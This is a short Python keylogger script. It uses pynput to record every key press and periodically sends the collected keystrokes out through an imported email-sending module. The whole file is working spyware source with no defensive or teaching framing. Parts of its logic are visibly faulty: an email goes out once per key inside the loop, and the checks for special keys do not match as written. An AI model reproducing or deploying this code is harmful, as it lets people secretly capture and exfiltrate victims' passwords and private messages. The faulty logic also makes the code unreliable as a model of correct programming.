import pynput
from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []

def onPress(key):
    print(key,end=" ")
    print("Pressed ")
    global keys, count
    keys.append(str(key)+'\n')
    count = count+1
    if count>20:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for i in keys:
        k = i.replace("'","")
        if i == "Key.space":
            k = " "
        elif i.find("Key")>0:
            k = ""
        message +=k
        send_email.sendEmail(message)

def onRelease(key):
    if key == Key.esc:
        return False
with Listener(on_press=onPress,on_release=onRelease) as listener:
    listener.join()
